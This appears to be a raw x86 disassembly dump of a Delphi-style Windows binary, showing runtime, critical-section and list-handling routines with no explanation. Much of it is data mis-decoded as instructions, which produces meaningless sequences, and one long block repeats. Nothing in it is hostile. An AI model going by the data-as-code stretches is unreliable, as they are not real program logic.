add [ eax + edx * 2 + 0x41 ] ch
add [ eax + 0x51 ] ah
inc ecx
add ah bl
push edx
inc ecx
add [ eax + 0x53 ] ch
inc ecx
add [ esp + edx * 2 ] bh
inc ecx
add [ eax ] dh
sub eax [ eax ]
jo r-xdata
inc ecx
outsb
jae r-xdata
add [ eax + r-xdata ] dl
push ebx
je r-xdata
popad
insd
mov eax eax
cmp [ esi ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] dl
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x41 ] dh
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
pushfd
inc cx
add [ eax + 0x64c80041 ] al
inc ecx
add ah bl
inc ecx
add [ esp + 0x41 ] bh
add [ esp + 0x61880041 ] cl
inc ecx
add [ esp + 0x540b0041 ] bl
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add al ch
pushad
inc ecx
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax + 0xc004161 ] cl
bound eax [ ecx ]
pop es
push esp
push ebx
je r-xdata
test [ eax + 0x41 ] ah
add al dl
pushad
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
and eax [ ecx ]
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
and eax [ ecx ]
push esp
and [ ecx ] eax
add [ eax ] al
pop es
insd
dec ebp
insd
outsd
jb r-xdata
insd
lodsb [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
inc ecx
add [ eax ] dl
add [ eax ] al
add [ 0x358c0041 ] al
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x60d00041 ] al
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ eax ] dh
sub eax [ eax ]
adc [ edi + 0x41 ] ah
add [ edx ] cl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
or al 0x62
je r-xdata
jb r-xdata
jae r-xdata
pop ecx
inc ecx
add [ eax - 0x2fffbeb6 ] bl
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
inc ecx
add [ eax + ebp * 2 ] al
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ esp + 0x540d0041 ] bl
dec eax
popad
outsb
insb
insd
shl [ 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
and eax 0x80041
add [ eax ] al
add al 0x25
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x64c80041 ] al
inc ecx
add ah bl
inc ecx
add [ esp + 0x41 ] bh
add [ esp + 0x61880041 ] cl
inc ecx
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x41 ] ch
add [ eax + eax ] al
add [ eax ] al
enter 0x4010 0x0
add [ ebp + 0x25500040 ] cl
test [ eax + 0x41 ] ah
add al dl
pushad
je r-xdata
outsd
jb r-xdata
insd
add [ edx ] cl
popad
insd
sub [ edi ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] cl
inc ecx
add [ eax + eax ] dl
add [ eax ] al
pushad
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x67
inc ecx
add [ eax + 0x67d80041 ] al
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ eax + 0x10004168 ] dl
inc ecx
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ edx + ebp * 2 + 0x41 ] cl
add [ eax ] dl
inc ecx
add [ edx ] cl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
movsb [ edi ] [ esi ]
daa
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
daa
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x26 ] ah
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
adc al 0x6a
inc ecx
add [ eax + 0x60d00041 ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_4122a0
pushfd
jae r-xdata
outsb
jae r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
add [ eax ] al
popad
jo r-xdata
add [ eax + 0x56 ] dl
jae r-xdata
inc ecx
add [ esi + edx * 2 + 0x57ec0041 ] al
inc ecx
add [ eax + ebx * 2 + 0x41 ] dh
add al dl
dec esi
inc ecx
add al cl
dec ebp
inc ecx
add [ eax ] dh
sub eax [ eax ]
push esp
push ecx
inc ecx
add [ eax ] dh
sub eax [ eax ]
pop esp
push ecx
inc ecx
add [ ecx + edx * 2 + 0x56500041 ] dh
jb r-xdata
jae r-xdata
inc ecx
add [ eax - 0xbffbeac ] ah
push esp
inc ecx
add [ eax + 0x38004155 ] ah
push edi
inc ecx
add [ eax + 0x24004157 ] dl
pop eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + 0xc0041 ] al
dec [ ebx + 0x412308c0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffbedd ] cl
and eax [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x10004123 0x0
add al ah
and [ ecx ] al
adc [ eax ] eax
add [ edi + ebp ] esi
add [ ebx + 0x4123ccc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax ] al
add al dl
and al 0x41
add [ eax ] dh
add [ eax ] al
add [ edx + 0x358c0041 ] bh
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
cld
outsb
jae r-xdata
add al cl
dec ebp
inc ecx
add [ esp + ebx * 2 + 0x5cd80041 ] ah
inc ecx
add ah bl
pop esp
inc ecx
add al ah
pop esp
inc ecx
add [ ecx + edx * 2 + 0x5e540041 ] dh
inc ecx
add [ eax - 0x7bffbea2 ] dh
pop edi
inc ecx
add [ eax + ebx * 2 + 0x41 ] dh
add al al
pop edi
inc ecx
add [ eax ] dh
inc ecx
add [ eax + 0x5a ] bl
inc ecx
add [ edx + ebx * 2 + 0x41 ] ah
add [ eax ] dl
dec ebp
inc ecx
add [ eax ] al
pop ebx
inc ecx
add [ eax + 0x5b ] al
inc ecx
add [ ebx + ebx * 2 + 0x51600041 ] ch
inc ecx
add [ ebx * 2 + 0x53680041 ] bh
inc ecx
add [ esp + edx * 2 ] bh
inc ecx
add [ eax + 0x5d ] bh
inc ecx
add [ eax - 0x5fffbea3 ] cl
push esp
inc ecx
add ah dh
push esp
inc ecx
add [ eax + 0x38004155 ] ah
push edi
inc ecx
add [ eax + 0x24004157 ] dl
pop eax
inc ecx
add al cl
pop edx
inc ecx
add ah ah
pop edx
inc ecx
add ah bl
pop ebp
inc ecx
add [ esp + ebx * 2 ] ch
inc ecx
add ah ch
pop edi
inc ecx
add ah bh
pop edi
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
ror [ esi + 0x41 ] 0x1
outsb
dec ecx
je r-xdata
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x60d00041 ] al
imul ebp [ esi + 0x67 ] 0x7473694c
loopne r-xdata
je r-xdata
test al 0x23
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
dec esi
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x4010
add [ eax ] al
add [ ebp + 0x24380040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
je r-xdata
popad
inc eax
add [ eax + 0x25 ] dl
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] eax
add [ eax ] al
test [ edx ] ah
inc ecx
add [ eax + eax ] cl
add [ ecx + ebx * 2 ] dh
inc ecx
add [ ecx + ebx * 2 + 0x4cc80041 ] bh
inc ecx
add ah ch
dec esp
inc ecx
add [ eax ] dl
dec ebp
inc ecx
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax + edx * 2 + 0x41 ] ch
add [ eax + 0x51 ] ah
inc ecx
add ah bl
push edx
inc ecx
add [ eax + 0x53 ] ch
inc ecx
add [ esp + edx * 2 ] bh
inc ecx
add [ eax ] dh
sub eax [ eax ]
jo r-xdata
inc ecx
outsb
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
cmp [ esi ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] dl
add [ eax ] cl
add [ eax ] al
add [ ebp + 0x41 ] dh
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
pushfd
inc cx
add [ eax + 0x64c80041 ] al
inc ecx
add ah bl
inc ecx
add [ esp + 0x41 ] bh
add [ esp + 0x61880041 ] cl
inc ecx
add [ esp + 0x540b0041 ] bl
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add al ch
pushad
inc ecx
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax + 0xc004161 ] cl
bound eax [ ecx ]
pop es
push esp
push ebx
je r-xdata
test [ eax + 0x41 ] ah
add al dl
pushad
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
and eax [ ecx ]
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
and eax [ ecx ]
push esp
and [ ecx ] eax
add [ eax ] al
pop es
insd
dec ebp
insd
outsd
jb r-xdata
insd
lodsb [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
inc ecx
add [ eax ] dl
add [ eax ] al
add [ 0x358c0041 ] al
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x60d00041 ] al
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ eax ] dh
sub eax [ eax ]
adc [ edi + 0x41 ] ah
add [ edx ] cl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
or al 0x62
je r-xdata
jb r-xdata
jae r-xdata
pop ecx
inc ecx
add [ eax - 0x2fffbeb6 ] bl
jns r-xdata
push ebx
je r-xdata
push ebx
push ebx
inc ecx
add [ eax + ebp * 2 ] al
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ esp + 0x540d0041 ] bl
dec eax
popad
outsb
insb
insd
shl [ 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
and eax 0x80041
add [ eax ] al
add al 0x25
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax + 0x64c80041 ] al
inc ecx
add ah bl
inc ecx
add [ esp + 0x41 ] bh
add [ esp + 0x61880041 ] cl
inc ecx
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x41 ] ch
add [ eax + eax ] al
add [ eax ] al
enter 0x4010 0x0
add [ ebp + 0x25500040 ] cl
test [ eax + 0x41 ] ah
add al dl
pushad
je r-xdata
outsd
jb r-xdata
insd
add [ edx ] cl
popad
insd
sub [ edi ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] cl
inc ecx
add [ eax + eax ] dl
add [ eax ] al
pushad
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x67
inc ecx
add [ eax + 0x67d80041 ] al
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ eax + 0x10004168 ] dl
inc ecx
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
outsd
inc ecx
add al ch
pushad
inc ecx
add al bl
inc cx
add [ edx + ebp * 2 + 0x41 ] cl
add [ eax ] dl
inc ecx
add [ edx ] cl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
popad
insd
mov eax eax
movsb [ edi ] [ esi ]
daa
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
daa
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x26 ] ah
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
adc al 0x6a
inc ecx
add [ eax + 0x60d00041 ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_412edc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ff4
pop edi
pop esi
pop ebx
retn
sub_412f04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405fd8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412f2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ffc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412fed
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
cwde
xor al 0x41
add [ edx ] cl
push esp
push edx
inc edi
jb r-xdata
nop
jne r-xdata
in al dx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
jae r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413024
mov esi eax
jmp r-xdata
fdiv [ edx ]
inc eax
add al bh
xor al [ eax ]
jo r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413024
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add [ eax + eax ] ah
add [ eax ] al
enter 0x4010 0x0
inc ecx
add [ ecx ] cl
push esp
push edx
inc edi
jb r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov [ esp + 0x4 ] edx
mov [ esp ] eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_403570
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
add al 0x89
add al 0x24
mov eax eax
or al 0x30
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi ] cl
inc ecx
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4143bc
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403570
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403570
test al al
je r-xdata
sub_413024
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_4143bc
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403570
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403570
test al al
je r-xdata
sub_413084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_413024
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413024
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403570
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4130f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_414210
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_413170
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
mov eax [ esi + 0x4 ]
call sub_403344
mov eax [ esi + 0x8 ]
call sub_403344
mov eax [ esi + 0xc ]
call sub_403344
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4131b0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4143bc
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4032a8
test al al
jne r-xdata
sub_413210
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4143bc
mov edx eax
mov eax ebp
call sub_403570
test al al
jne r-xdata
sub_413254
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4132ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_403294
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042f8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4131b0
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_414210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4132f6
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
sub_413314
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405134
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_413334
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4143bc
mov edx edi
call sub_413314
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4143bc
mov edx edi
call sub_413314
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_41425c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_413314
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_41425c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4133d8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4143bc
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_413210
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_413424
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4130f4
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_414210
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_413498
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4143bc
call sub_403344
inc edi
dec ebp
jne r-xdata
sub_4134f4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4143bc
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_413084
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_413538
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
